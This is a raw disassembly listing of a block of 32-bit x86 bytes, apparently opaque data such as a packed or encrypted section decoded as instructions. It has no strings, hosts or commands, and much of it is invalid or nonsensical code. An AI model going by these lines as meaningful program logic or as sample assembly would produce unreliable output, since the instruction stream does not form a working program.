  40733c:	pop    ebp
  40733d:	adc    dh,BYTE PTR [edx+0x61e9c75f]
  407343:	dec    ebx
  407344:	int    0xc4
  407346:	and    cl,BYTE PTR [edx+ebp*8]
  407349:	int    0xe8
  40734b:	mov    edi,0xbd80bcda
  407350:	mov    edx,0xde99d6bd
  407355:	ins    DWORD PTR es:[edi],dx
  407356:	and    al,0x74
  407358:	add    BYTE PTR [eax],al
  40735a:	pop    ebp
  40735b:	sbb    eax,ecx
  40735d:	sub    dh,BYTE PTR [eax+ecx*1-0x27]
  407361:	jb     0x40732b
  407363:	clc    
  407364:	cli    
  407365:	or     bh,BYTE PTR [ebp-0x149b0708]
  40736b:	add    al,0x5d
  40736d:	stc    
  40736e:	repz rol BYTE PTR [ebx],cl
  407371:	das    
	...
  40737e:	add    BYTE PTR [eax],al
  407380:	add    BYTE PTR [ebx-0x3a],cl
  407383:	shl    ah,0x67
  407386:	enter  0xb28b,0xce
  40738a:	mov    ah,0x23
  40738c:	mov    al,0xd6
  40738e:	mov    edi,0x586a7d8d
  407393:	adc    al,0x25
  407395:	or     BYTE PTR gs:[esi-0x3f],dl
  407399:	mov    eax,ds:0x90ea09c7
  40739e:	nop
  40739f:	clc    
  4073a0:	mov    edx,0xbafae8e6
  4073a5:	fmul   DWORD PTR [edx-0x5c1e1974]
  4073ab:	mov    eax,ds:0x3c4b6691
  4073b0:	sub    BYTE PTR [eax-0x11ccfcf5],ah
  4073b6:	mov    edi,0xb47e5033
  4073bb:	xor    edx,DWORD PTR [ebx-0x24]
  4073be:	cdq    
  4073bf:	pop    ds
  4073c0:	xor    DWORD PTR [esi-0x3d151828],esp
  4073c6:	adc    eax,0x87b2ac1
  4073cb:	fldenv [edx+0x8]
  4073ce:	clc    
  4073cf:	cli    
  4073d0:	retf   0xf806
  4073d3:	clc    
  4073d4:	ins    BYTE PTR es:[edi],dx
  4073d5:	jmp    0x4073da
  4073d7:	out    0x24,al
  4073d9:	add    dh,ah
  4073db:	add    ah,BYTE PTR [edi+0xc0c544]
  4073e1:	aaa    
  4073e2:	add    ebx,eax
  4073e4:	mov    eax,DWORD PTR [eax]
	...
  4073f2:	add    BYTE PTR [eax],al
  4073f4:	popa   
  4073f5:	mov    dl,0xf7
  4073f7:	and    edx,DWORD PTR [ebx]
  4073f9:	mov    cl,0xfa
  4073fb:	lea    esi,[esi+0x6507d61e]
  407401:	ret    0x5603
  407404:	inc    edx
  407405:	enter  0x9c2,0x9
  407409:	fmul   DWORD PTR [ebx+0x237b49f8]
  40740f:	sti    
  407410:	jmp    0xcdcd0194
  407415:	mov    WORD PTR ds:0x4e0116d5,cs
  40741b:	or     al,0xfb
  40741d:	(bad)  
  40741e:	push   cs
  40741f:	add    edx,DWORD PTR [eax]
  407421:	mov    edx,edi
  407423:	xor    eax,DWORD PTR [ebx]
  407425:	mov    eax,ds:0x8ad033f7
  40742a:	pushf  
  40742b:	pop    ds
  40742c:	das    
  40742d:	adc    al,0x5a
  40742f:	inc    ebp
  407430:	mov    ecx,0xc9c12025
  407435:	adc    eax,DWORD PTR [ebx]
  407437:	fld    DWORD PTR [ecx]
  407439:	jg     0x40746e
  40743b:	sti    
  40743c:	cdq    
  40743d:	jns    0x407472
  40743f:	stc    
  407440:	je     0x6153794d
  407446:	test   eax,0xc0b3c403
  40744b:	rol    BYTE PTR [edi+0x218bc300],0xb1
  407452:	mul    DWORD PTR [ebx]
  407454:	mov    ds:0x8dfab1,eax
	...
  407465:	add    BYTE PTR [eax],al
  407467:	mov    dh,0x1d
  407469:	clc    
  40746a:	mov    ds:0x56037a8d,eax
  40746f:	push   edx
  407470:	enter  0x9c2,0x49
  407474:	xlat   BYTE PTR ds:[ebx]
  407475:	mov    edi,eax
  407477:	arpl   di,bx
  407479:	mov    ebp,0xbbe02823
  40747e:	(bad)  
  40747f:	xlat   BYTE PTR ds:[ebx]
  407480:	mov    bl,0xda
  407482:	add    cl,BYTE PTR [ebx+eax*4-0x1288b1fc]
  407489:	ror    DWORD PTR [esi],0x60
  40748c:	out    0x8b,al
  40748e:	cli    
  40748f:	push   eax
  407490:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407491:	jecxz  0x40748a
  407493:	xor    BYTE PTR [esi+0x26549c91],ah
  407499:	push   eax
  40749a:	sub    bl,dh
  40749c:	scas   eax,DWORD PTR es:[edi]
  40749d:	pop    ebp
  40749e:	xor    BYTE PTR [edx],ah
  4074a0:	jo     0x4074ba
  4074a2:	add    edi,DWORD PTR [edx-0x26cc42c9]
  4074a8:	mov    edi,0xa3e78dba
  4074ad:	inc    ecx
  4074ae:	cmp    ecx,ecx
  4074b0:	arpl   WORD PTR [ebx],ax
  4074b2:	inc    esi
  4074b3:	push   edi
  4074b4:	ins    DWORD PTR es:[edi],dx
  4074b5:	les    eax,FWORD PTR [eax+eiz*2]
  4074b8:	outs   dx,DWORD PTR ds:[esi]
  4074b9:	mov    edi,ebx
  4074bb:	jo     0x407452
  4074bd:	repz not esi
  4074c0:	pop    eax
  4074c1:	pop    ss
  4074c2:	adc    DWORD PTR [ebp+0x2d0386bd],0xc2c4cc
	...
  4074d8:	add    BYTE PTR [eax],al
  4074da:	pop    eax
  4074db:	scas   eax,DWORD PTR es:[edi]
  4074dc:	ror    DWORD PTR [ebx+0x33bb1f8b],cl
  4074e2:	jns    0x40750d
  4074e4:	nop
  4074e5:	cmovno ecx,ebp
  4074e8:	mov    al,ds:0xef9a606d
  4074ed:	shl    BYTE PTR [edx-0x1735fd24],0x45
  4074f4:	repz not DWORD PTR [eax+0x6c9c90f5]
  4074fb:	fdivr  st,st(3)
  4074fd:	in     al,0x46
  4074ff:	add    eax,0xc47b5dea
  407504:	sub    dl,BYTE PTR [edi]
  407506:	pusha  
  407507:	fsub   QWORD PTR [edx-0x43]
  40750a:	jo     0x4074cb
  40750c:	fidivr DWORD PTR [edx+0x47ee80d6]
  407512:	or     DWORD PTR [ebx+0x45],edi
  407515:	add    ebx,DWORD PTR [ebp+0x67c42801]
  40751b:	push   es
  40751c:	sub    cl,BYTE PTR [ebx-0xd2009f8]
  407522:	hlt    
  407523:	xchg   DWORD PTR [ebp+0x16],esi
  407526:	retf   0xb7c9
  407529:	dec    edx
  40752a:	pusha  
  40752b:	push   ebx
  40752c:	stc    
  40752d:	les    esp,FWORD PTR [ecx]
  40752f:	push   cs
  407530:	jmp    0x90ba:0xfabce8d3
  407537:	mov    edi,0x255c8f64
  40753c:	and    bh,BYTE PTR [ebx+0x0]
	...
  40754b:	add    BYTE PTR [eax],al
  40754d:	int    0x5
  40754f:	aaa    
  407550:	and    BYTE PTR [edx-0x56fd063d],ah
  407556:	lea    edx,[ebx-0x700a4b0e]
  40755c:	nop
  40755d:	(bad)  
  40755e:	sbb    ecx,edi
  407560:	jg     0x40753e
  407562:	jp     0x40754e
  407564:	pop    ebp
  407565:	dec    ebx
  407566:	les    ebp,FWORD PTR [edx+0x62dc6016]
  40756c:	mov    esp,0xbb1abf50
  407571:	out    dx,al
  407572:	and    dh,0xc5
  407575:	cmc    
  407576:	popf   
  407577:	add    DWORD PTR [ebx],eax
  407579:	and    eax,0x5fc327f1
  40757e:	push   es
  40757f:	sub    cl,BYTE PTR [edx-0xdc00aa8]
  407585:	dec    esp
  407586:	mov    eax,DWORD PTR [eax]
  407588:	pop    ebp
  407589:	jne    0x407546
  40758b:	daa    
  40758c:	mov    dl,bh
  40758e:	add    al,0x16
  407590:	sub    BYTE PTR [edx],ah
  407592:	or     eax,0xbde93903
  407597:	xor    edx,DWORD PTR [edx]
  407599:	xor    DWORD PTR [edi-0x7daaa273],edi
  40759f:	xor    BYTE PTR [esi],dl
  4075a1:	xor    al,0x5
  4075a3:	dec    esi
  4075a4:	in     eax,dx
  4075a5:	pop    ds
  4075a6:	(bad)  
  4075a7:	adc    dl,ch
  4075a9:	sbb    cl,BYTE PTR [ebp-0xb374506]
  4075af:	clc    
  4075b0:	je     0x4075b2
	...
  4075be:	add    BYTE PTR [eax],al
  4075c0:	ret    
  4075c1:	sbb    BYTE PTR ds:0x301e8fc,al
  4075c7:	aaa    
  4075c8:	dec    edi
  4075c9:	mov    bl,0xf6
  4075cc:	arpl   si,bx
  4075ce:	mov    eax,eax
  4075d0:	sar    BYTE PTR [esi-0x7e1b3dcd],cl
  4075d6:	pop    es
  4075d7:	lock mov al,0xd1
  4075da:	fldl2e 
  4075dc:	push   ds
  4075dd:	loope  0x40759f
  4075df:	test   eax,0x72c3046b
  4075e4:	cli    
  4075e5:	hlt    
  4075e6:	clc    
  4075e7:	(bad)  
  4075e9:	mov    dl,BYTE PTR [esi+esi*8-0x70246103]
  4075f0:	bound  ecx,QWORD PTR [edi+0x30]
  4075f3:	test   al,0xa1
  4075f5:	or     al,0x3
  4075f7:	cdq    
  4075f8:	fidivr DWORD PTR [ebp-0x416d8dcd]
  4075fe:	lea    esi,[ebp+0x6e]
  407601:	mov    ebp,0x4568b7c
  407606:	dec    esi
  407607:	adc    eax,0xea10c6a0
  40760c:	call   0x337c:0x5900fa8c
  407613:	stc    
  407614:	(bad)  
  407615:	gs pop ds
  407617:	gs in  al,dx
  407619:	daa    
  40761a:	les    eax,FWORD PTR [ebx]
  40761c:	aam    0xb
  40761e:	rol    ebx,0x3d
  407621:	add    eax,0xbfd9
	...
  407632:	add    BYTE PTR [ebp+0x7a],dl
  407635:	(bad)  
  407636:	dec    DWORD PTR [ecx]
  407638:	jle    0x407645
  40763a:	sti    
  40763b:	or     DWORD PTR [ebx-0x73],edi
  40763e:	test   BYTE PTR ds:0xe292240,cl
  407644:	add    eax,0xff3ac106
  407649:	add    al,bl
  40764b:	xor    eax,0x5ffff7a
  407650:	mov    ch,0xf8
  407652:	or     eax,DWORD PTR [edx]
  407654:	mov    ch,0xfa
  407656:	lea    ebp,[esi+0x11]
  407659:	xchg   edi,eax
  40765a:	jmp    DWORD PTR [eax+0x46]
  40765d:	add    edx,DWORD PTR [esi-0x3a]
  407660:	ret    0xac2
  407663:	leave  
  407664:	sar    DWORD PTR [edi-0x86ea01],cl
  40766a:	xor    edx,DWORD PTR [ecx]
  40766c:	or     eax,0x870233fa
  407671:	mov    WORD PTR [edi],cs
  407673:	sbb    eax,0xb9ab93a5
  407678:	dec    ecx
  407679:	cmp    cl,al
  40767b:	sti    
  40767c:	or     BYTE PTR [ebx],al
  40767e:	retf   0x7925
  407681:	(bad)  
  407682:	call   DWORD PTR ds:0x130bf7b5
  407688:	mov    ch,0xf9
  40768a:	lea    edx,[esi]
  40768c:	sbb    DWORD PTR [ecx],edi
  40768e:	mov    al,ds:0x5e0377f9
  407693:	outs   dx,BYTE PTR ds:[esi]
  407694:	ret    0x15c3
	...
  4076a3:	add    BYTE PTR [eax],al
  4076a5:	add    BYTE PTR [ebx-0x55],ah
  4076a8:	fidivr DWORD PTR [edi-0x43b99c]
  4076ae:	nop
  4076af:	inc    edx
  4076b0:	or     bl,bh
  4076b2:	nop
  4076b3:	inc    ebp
  4076b4:	mov    es,WORD PTR [esp+eiz*2-0x41a4a615]
  4076bb:	stos   DWORD PTR es:[edi],eax
  4076bc:	inc    ebp
  4076bd:	xor    BYTE PTR [edx],ah
  4076bf:	in     eax,dx
  4076c0:	add    al,0x3
  4076c2:	and    BYTE PTR [eax-0x44],bl
  4076c5:	jmp    FWORD PTR [eax+edx*1]
  4076c8:	lock clc 
  4076ca:	pop    eax
  4076cb:	adc    al,0xf0
  4076cd:	cli    
  4076ce:	out    dx,al
  4076cf:	pop    eax
  4076d0:	adc    al,0x92
  4076d2:	daa    
  4076d3:	test   eax,0xa0b5038c
  4076d8:	ret    0x59c2
  4076db:	stos   DWORD PTR es:[edi],eax
  4076dc:	sar    DWORD PTR [edi-0x446004],cl
  4076e2:	xor    BYTE PTR [ebx-0x2bcf05f1],ah
  4076e8:	mov    DWORD PTR [esp+edx*2-0x23104fb7],ecx
  4076ef:	stos   DWORD PTR es:[edi],eax
  4076f0:	dec    ecx
  4076f1:	sub    BYTE PTR [edx-0x66fcf493],ah
  4076f7:	das    
  4076f8:	mov    ebx,0xf767c4ff
  4076fd:	imul   DWORD PTR [eax+0x65]
  407700:	idiv   ecx
  407702:	out    0x38,al
  407704:	sbb    edx,ecx
  407706:	push   cs
  407707:	sub    BYTE PTR [ecx+0x3],al
	...
  407719:	add    eax,0x76c3c4a0
  40771e:	stos   DWORD PTR es:[edi],eax
  40771f:	fdivr  QWORD PTR [edi-0x44c86c]
  407725:	push   eax
  407726:	xor    cl,BYTE PTR [edi]
  407728:	sti    
  407729:	push   eax
  40772a:	xor    eax,0x5648489
  40772f:	mov    dh,0x39
  407731:	retf   
  407732:	es jmp 0x6002:0x29c44341
  40773a:	ret    0xbb8e
  40773d:	pop    esp
  40773e:	mov    dh,0x46
  407740:	neg    DWORD PTR [ebx+0xa]
  407743:	inc    ecx
  407744:	test   DWORD PTR [ecx-0x78],0x9f43135d
  40774b:	std    
  40774c:	mov    ecx,0xc4e54f60
  407751:	and    DWORD PTR [ebx],ecx
  407753:	jmp    0x24bb:0x16b5ecd3
  40775a:	repnz adc DWORD PTR [edi],ecx
  40775d:	sbb    edx,esi
  40775f:	add    BYTE PTR [ecx+0x46d505e7],cl
  407765:	bound  esp,QWORD PTR [edx-0x16]
  407768:	dec    ecx
  407769:	imul   eax,esp,0x28
  40776c:	or     esp,DWORD PTR [eax-0x35]
  40776f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407770:	mov    edx,0xf6deb5f4
  407775:	hlt    
  407776:	or     eax,edx
  407778:	imul   dl
  40777a:	xchg   DWORD PTR [ebp+0x1a],ebp
	...
  407789:	add    BYTE PTR [eax],al
  40778b:	add    BYTE PTR [edx],al
  40778d:	adc    al,0xf1
  40778f:	dec    ecx
  407790:	pusha  
  407791:	push   edi
  407792:	cmc    
  407793:	les    esp,FWORD PTR [eax+0x4dcea0f]
  407799:	mov    dh,0xae
  40779b:	mov    edx,0xea2f1bc
  4077a0:	mov    eax,0xe7889ff1
  4077a5:	std    
  4077a6:	push   0x39
  4077a8:	adc    BYTE PTR [esi-0x3b8cbe16],ch
  4077ae:	test   eax,0x3ec26001
  4077b3:	mov    edx,0x7600b58c
  4077b8:	lea    edi,[ebx+ecx*1-0x72458a8f]
  4077bf:	jge    0x407812
  4077c1:	lock icebp 
  4077c3:	and    ebp,edx
  4077c5:	add    DWORD PTR [esi+0x5],edx
  4077c8:	sahf   
  4077c9:	ret    0xea0a
  4077cc:	xor    BYTE PTR [ebp-0x1],dh
  4077cf:	inc    esi
  4077d0:	sbb    DWORD PTR [ebp-0x50a2bdcd],esi
  4077d6:	xor    esi,DWORD PTR [ecx]
  4077d8:	fild   DWORD PTR [ecx-0x22e98df1]
  4077de:	sub    ch,dl
  4077e0:	stos   BYTE PTR es:[edi],al
  4077e1:	std    
  4077e2:	shr    BYTE PTR [eax],0x59
  4077e5:	or     dl,cl
  4077e7:	push   esi
  4077e8:	jmp    0x154f77a1
  4077ed:	mov    ebp,0xb
	...
  4077fe:	add    BYTE PTR ds:0x695d8daf,cl
  407804:	xchg   esi,eax
  407805:	shr    DWORD PTR [edi-0x4b],cl
  407808:	or     BYTE PTR [esi-0x3b],bl
  40780b:	daa    
  40780c:	leave  
  40780d:	adc    eax,0x7d8119ea
  407812:	icebp  
  407813:	popa   
  407814:	or     al,0x1
  407816:	arpl   WORD PTR ss:[esi],ax
  407819:	dec    edi
  40781a:	loope  0x40787d
  40781c:	pop    esp
  40781d:	or     al,0xc6
  40781f:	sbb    al,0xb1
  407821:	lea    esi,[edi]
  407823:	daa    
  407824:	add    al,0x89
  407826:	out    0x6,al
  407828:	mov    ch,0xff
  40782a:	adc    ebx,DWORD PTR [eax]
  40782c:	push   eax
  40782d:	pop    eax
  40782e:	inc    esi
  40782f:	sbb    DWORD PTR [esi+0x5a60edc2],edi
  407835:	mov    eax,DWORD PTR [ebp+0x36f8c9de]
  40783b:	xor    DWORD PTR [eax-0x39],ebx
  40783e:	add    BYTE PTR [edi+0x6d],al
  407841:	add    BYTE PTR [eax],al
  407843:	jp     0x40784d
  407845:	push   DWORD PTR [ebp+0x7e]
  407848:	jge    0x40788f
  40784a:	clc    
  40784b:	lds    esi,FWORD PTR [edi+ebx*1+0x108cb65]
  407852:	and    eax,edi
  407854:	in     eax,0xc6
  407856:	add    eax,0x411456
  40785b:	ret    
  40785c:	and    cl,ch
  40785e:	out    dx,eax
  40785f:	test   DWORD PTR [edi+eiz*1+0x65],esi
	...
  407872:	sti    
  407873:	pop    es
  407874:	(bad)  
  407875:	(bad)  
  407877:	xchg   ecx,eax
  407878:	mov    DWORD PTR ds:0x41133e,0x103243d4
  407882:	test   DWORD PTR [edi+ebp*1-0xff8049b],esi
  407889:	loope  0x4078e3
  40788b:	retf   0x1ceb
  40788e:	xchg   ecx,eax
  40788f:	hlt    
  407890:	pop    es
  407891:	add    eax,edi
  407893:	jnp    0x4078ff
  407895:	inc    eax
  407896:	loop   0x40783b
  407898:	fs inc ecx
  40789a:	or     bl,BYTE PTR [eax-0x18]
  40789d:	arpl   WORD PTR [ebx],dx
  40789f:	ins    DWORD PTR es:[edi],dx
  4078a0:	inc    DWORD PTR [ebx-0x17bf92b9]
  4078a6:	mov    esi,0x49000007
  4078ab:	jmp    0x4078a4
  4078ad:	inc    eax
  4078ae:	cdq    
  4078af:	iret   
  4078b0:	mov    ebx,DWORD PTR [ebp-0x5e]
  4078b3:	mov    bl,al
  4078b5:	inc    eax
  4078b6:	inc    ecx
  4078b7:	repz pop es
  4078b9:	add    eax,DWORD PTR [edi-0x6997ac93]
  4078bf:	adc    al,BYTE PTR [ecx+0x0]
  4078c2:	push   0x61
  4078c4:	cmp    al,0xe9
  4078c6:	arpl   WORD PTR [ebx-0x7dc1fe48],bx
  4078cc:	rol    DWORD PTR [ebx+0x43014f],0xe3
  4078d3:	push   ds
  4078d4:	lods   al,BYTE PTR ds:[esi]
  4078d5:	aaa    
	...
  4078e2:	add    BYTE PTR [eax],al
  4078e4:	add    BYTE PTR ds:0x6beb84d7,cl
  4078ea:	mov    edx,0xd1c0800d
  4078ef:	push   ds
  4078f0:	inc    ecx
  4078f1:	arpl   WORD PTR [esi+0x456d7844],bx
  4078f7:	mov    WORD PTR [eax],es
  4078f9:	arpl   WORD PTR [esp+edi*2-0x47b3ab38],bx
  407900:	jmp    0x407963
  407902:	js     0x407911
  407904:	add    BYTE PTR [eax],0xc9
  407907:	push   ds
  407908:	inc    ecx
  407909:	arpl   WORD PTR [esp+eax*2+0x3e382d78],bx
  407910:	or     al,0xea
  407912:	mov    ah,0x3
  407914:	add    BYTE PTR [ebx-0x31],ah
  407917:	aad    0xf7
  407919:	add    dl,ah
  40791b:	retf   
  40791c:	movaps XMMWORD PTR [eax+0x33],xmm0
  407920:	mov    gs:0x77158a9c,al
  407926:	add    DWORD PTR [edx+0x0],0x3950b
  40792d:	arpl   WORD PTR [ebp-0x1c],di
  407930:	mov    fs:0x3f158a9c,al
  407936:	inc    ecx
  407937:	inc    ebp
  407938:	add    al,ch
  40793a:	shr    ebx,1
  40793c:	and    bl,BYTE PTR fs:[esi+eax*1+0x7765cc8]
  407944:	leave  
  407945:	add    ch,bh
  407947:	and    BYTE PTR [ecx+0x0],al
	...
  407956:	add    BYTE PTR [eax],al
  407958:	arpl   WORD PTR ds:0x53e2411,sp
  40795e:	sub    BYTE PTR [edx+ebx*8],al
  407961:	add    cl,dl
  407963:	and    BYTE PTR [edx],ah
  407965:	add    eax,0x4407e848
  40796a:	jmp    0xc35e7f9
  40796f:	inc    ebp
  407970:	arpl   WORD PTR [edx],ax
  407972:	mov    cl,0x7
  407974:	cdq    
  407975:	lds    sp,DWORD PTR [eax]
  407978:	and    al,BYTE PTR ds:0x28331160
  40797e:	test   al,0x3
  407980:	stc    
  407981:	sbb    BYTE PTR [esi+0x31],bl
  407984:	push   ebx
  407985:	sbb    eax,0x5a22109
  40798a:	inc    ecx
  40798b:	xchg   ecx,eax
  40798c:	dec    ebx
  40798d:	mov    dl,0x46
  40798f:	pop    ebx
  407990:	lods   eax,DWORD PTR ds:[esi]
  407991:	push   edx
  407992:	xor    dl,al
  407994:	push   edi
  407995:	add    eax,0x864f8a9c
  40799a:	and    eax,0x26acfabc
  40799f:	mov    bh,0x2c
  4079a1:	jle    0x407988
  4079a3:	enter  0x28af,0xa8
  4079a7:	add    ebp,eax
  4079a9:	sbb    BYTE PTR [esp+edi*1],bl
  4079ac:	jle    0x4079f2
  4079ae:	jmp    0x334294b9
  4079b3:	lea    ebx,[edi-0x40]
  4079b6:	jge    0x4079d8
  4079b8:	mov    ds:0x106005,al
	...
  4079c9:	add    BYTE PTR [eax],al
  4079cb:	es sub eax,0x4463454c
  4079d1:	push   esp
  4079d2:	fldcw  WORD PTR [edx-0x2349293c]
  4079d8:	jge    0x4079bf
  4079da:	mov    BYTE PTR [ebx+0x2b],cl
  4079dd:	sub    BYTE PTR [eax+ebx*8],al
  4079e0:	sbb    BYTE PTR [edi+ecx*2+0x3d],ch
  4079e4:	inc    esp
  4079e5:	add    cl,ch
  4079e7:	mov    cl,0x5
  4079e9:	(bad)  
  4079ea:	in     eax,dx
  4079eb:	push   esi
  4079ec:	inc    esp
  4079ed:	add    dl,bl
  4079ef:	pop    esp
  4079f0:	xor    BYTE PTR [edi+eax*1],0x1e
  4079f4:	add    eax,0xc4b7ab33
  4079f9:	mov    ebp,esp
  4079fb:	jmp    0x407a35
  4079fd:	data16 sub BYTE PTR [edi+0x44],ah
  407a01:	jne    0x40799a
  407a03:	(bad)  [edi]
  407a05:	and    BYTE PTR [esi+eiz*1],cl
  407a08:	add    eax,0x2894b48b
  407a0d:	inc    ecx
  407a0e:	jmp    0xc46869ec
  407a13:	pop    ds
  407a14:	add    eax,0x2a4b1cff
  407a19:	inc    ecx
  407a1a:	jmp    0x473cc4fc
  407a1f:	push   ebx
  407a20:	loope  0x407a86
  407a22:	test   al,0x60
  407a24:	add    BYTE PTR [ebp+0x31],0xbf
  407a28:	mov    eax,ds:0x7ced2eff
  407a2d:	(bad)  
  407a2e:	jb     0x407a30
	...
  407a3c:	add    BYTE PTR [eax],al
  407a3e:	in     eax,dx
  407a3f:	mov    eax,0xe4e6cad2
  407a44:	push   esp
  407a45:	adc    eax,0xe503c369
  407a4a:	jmp    0x4079d5
  407a4c:	gs test al,0x60
  407a4f:	add    al,0x45
  407a51:	add    DWORD PTR [ebx-0x72],esp
  407a54:	jns    0x407ac1
  407a56:	call   0xf84a:0xdeed75b0
  407a5d:	jo     0x407a93
  407a5f:	mov    cl,0xc1
  407a61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a62:	dec    ebp
  407a63:	jl     0x407a63
  407a65:	bound  edx,QWORD PTR [edx]
  407a67:	mov    ebx,0x41cd63e4
  407a6d:	add    BYTE PTR [edi+0x5ecb9bd],cl
  407a73:	jnp    0x407a74
  407a75:	mov    ecx,DWORD PTR [edi+edi*2]
  407a78:	xlat   BYTE PTR ds:[ebx]
  407a79:	xor    edi,DWORD PTR [edi+0x6d]
  407a7c:	xor    eax,edx
  407a7e:	mov    ecx,0x5fd48cb0
  407a83:	inc    esp
  407a84:	add    BYTE PTR [ebx],al
  407a86:	dec    edi
  407a87:	jno    0x407a8e
  407a89:	mov    eax,ds:0xff6ecce1
  407a8e:	(bad)  
  407a8f:	js     0x407a20
  407a91:	inc    ebp
  407a92:	loop   0x407b10
  407a94:	jge    0x407a92
  407a96:	retf   
  407a97:	outs   dx,DWORD PTR ds:[esi]
  407a98:	push   ds
  407a99:	mov    eax,DWORD PTR [esi+edi*2]
  407a9c:	repz sar DWORD PTR [ecx],0xb0
  407aa0:	add    bl,al
	...
  407aae:	add    BYTE PTR [eax],al
  407ab0:	add    BYTE PTR [ebx-0x59463021],bh
  407ab6:	jp     0x407ab7
  407ab8:	inc    ecx
  407aba:	jb     0x407a47
  407abc:	push   ebp
  407abd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407abe:	inc    BYTE PTR [esp+edi*8+0x59]
  407ac2:	ret    0xc623
  407ac5:	inc    ecx
  407ac6:	mov    BYTE PTR [ebx],0x4
  407ac9:	xchg   edi,eax
  407aca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407acb:	gs inc ecx
  407acd:	cmp    al,BYTE PTR ds:0xd83ff845
  407ad3:	mov    esp,0x757a851b
  407ad8:	cld    
  407ad9:	mov    ch,0xf0
  407adb:	test   DWORD PTR [ecx-0x393e8819],0x8bfe7d24
  407ae5:	stc    
  407ae6:	ret    0x5c3
  407ae9:	or     esp,ecx
  407aeb:	inc    ecx
  407aec:	jne    0x407a9f
  407aee:	sub    ch,ah
  407af0:	inc    DWORD PTR ds:0x63c68b79
  407af6:	and    ecx,esp
  407af8:	xor    ebx,DWORD PTR [esi]
  407afa:	ret    0xc1f0
  407afd:	pusha  
  407afe:	mov    ds:0xdd3d7486,al
  407b03:	add    eax,DWORD PTR [ebx]
  407b05:	es jbe 0x407b06
  407b08:	aad    0xa2
  407b0a:	cmp    ecx,edx
  407b0c:	push   DWORD PTR [esi]
  407b0e:	push   0xffffff84
  407b10:	inc    ebp
  407b11:	stos   DWORD PTR es:[edi],eax
  407b12:	xor    al,0x36
  407b14:	cld    
	...
  407b21:	add    BYTE PTR [eax],al
  407b23:	add    BYTE PTR [edx-0x6a74eaa1],ah
  407b29:	and    dh,BYTE PTR [eax+0xa0a0c1]
  407b2f:	fsub   DWORD PTR [edx]
  407b31:	mov    ecx,0xbe5e01d3
  407b36:	push   ds
  407b37:	inc    ecx
  407b38:	arpl   WORD PTR [ebp+0x5d0623ee],bx
  407b3e:	add    eax,DWORD PTR [ecx]
  407b40:	es push ss
  407b42:	pop    ds
  407b43:	inc    ecx
  407b44:	arpl   WORD PTR [ebx],sp
  407b46:	ds cld 
  407b48:	bound  ebp,QWORD PTR [ecx-0x635d9b19]
  407b4e:	mov    BYTE PTR [ebp+0x4b],al
  407b51:	sahf   
  407b52:	(bad)  
  407b53:	das    
  407b54:	(bad)  
  407b55:	pop    ebp
  407b56:	add    ecx,ecx
  407b58:	and    BYTE PTR [edx-0x6dd31378],bl
  407b5e:	or     ebp,eax
  407b60:	mov    dl,0x25
  407b62:	add    eax,DWORD PTR [eax]
  407b64:	loopne 0x407b7a
  407b66:	mov    ah,0x75
  407b68:	cmp    eax,0xfb082dff
  407b6d:	xchg   edx,eax
  407b6e:	jp     0x407b70
  407b70:	arpl   WORD PTR [ebx-0xb9b8a3d],si
  407b76:	mov    bl,0xff
  407b78:	hlt    
  407b79:	lahf   
  407b7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b7b:	adc    ebx,eax
  407b7d:	add    eax,0xfad30029
  407b82:	test   al,0x39
  407b84:	fs ins DWORD PTR es:[edi],dx
  407b86:	(bad)  
  407b87:	mov    bl,0x0
	...
  407b95:	add    BYTE PTR [eax],al
  407b97:	aam    0xae
  407b99:	ret    0xd808
  407b9c:	add    eax,0xc39a0472
  407ba1:	in     eax,0x3
  407ba3:	push   ss
  407ba4:	jp     0x407b6b
  407ba6:	xchg   DWORD PTR [edi-0x7608e54b],ebx
  407bac:	sbb    ebp,edi
  407bae:	sbb    eax,0x9beb1b62
  407bb3:	pop    ecx
  407bb4:	ins    BYTE PTR es:[edi],dx
  407bb5:	jmp    0x8eee5bbd
  407bba:	cmp    DWORD PTR [ecx-0x66],esp
  407bbd:	or     edi,DWORD PTR [edi-0x55]
  407bc0:	sbb    ebx,ecx
  407bc2:	and    BYTE PTR [esi],0xb5
  407bc5:	sbb    DWORD PTR [ebx+ebp*8+0x5b36ea7],ebx
  407bcc:	(bad)  
  407bcd:	lods   al,BYTE PTR ds:[esi]
  407bce:	mov    bl,0x61
  407bd0:	add    eax,0x87734172
  407bd5:	and    al,0x2a
  407bd7:	jmp    0xe901:0xce875b3f
  407bde:	aaa    
  407bdf:	pop    esi
  407be0:	jp     0x407b86
  407be2:	dec    DWORD PTR [ecx+0xe]
  407be5:	push   0x31
  407be7:	addr16 add eax,0x2fe1fdb4
  407bed:	icebp  
  407bee:	add    ebp,DWORD PTR [esi+0x9e91209]
  407bf4:	(bad)  
  407bf5:	adc    eax,0x7d9d6b39
  407bfa:	mov    dl,0x0
	...
  407c08:	add    BYTE PTR [eax],al
  407c0a:	or     al,0xae
  407c0c:	push   0xffffffac
  407c0e:	add    al,0x38
  407c10:	jmp    0x407bb0
  407c12:	push   edi
  407c13:	jl     0x407c15
  407c15:	lods   al,BYTE PTR ds:[esi]
  407c16:	lods   al,BYTE PTR ds:[esi]
  407c17:	sbb    dl,BYTE PTR [eax]
  407c19:	pop    esp
  407c1a:	call   0xb8a8:0xc73a50b5
  407c21:	jmp    0xd738fe86
  407c26:	fwait
  407c27:	std    
  407c28:	push   edx
  407c29:	shl    DWORD PTR [ecx-0x3216ff94],0xca
  407c30:	mov    ebp,DWORD PTR [edx-0x1a3d43d3]
  407c36:	pusha  
  407c37:	pop    eax
  407c38:	mov    edi,DWORD PTR [ebp+0x24835615]
  407c3e:	dec    edi
  407c3f:	add    eax,0x408f275
  407c44:	add    cl,ch
  407c46:	pusha  
  407c47:	dec    esi
  407c48:	pop    ebx
  407c49:	mov    al,ds:0x720000a6
  407c4e:	push   ebx
  407c4f:	add    DWORD PTR [ebx+0x560e9],edi
  407c55:	add    ebx,DWORD PTR [edi-0x52]
  407c58:	jne    0x407c33
  407c5a:	or     DWORD PTR [esi+0x74c8f175],ebp
  407c60:	mov    eax,0xc08260e9
  407c65:	xlat   BYTE PTR ds:[ebx]
  407c66:	ins    BYTE PTR es:[edi],dx
  407c67:	or     al,bh
  407c69:	add    BYTE PTR [edx+0xc48315],bl
	...
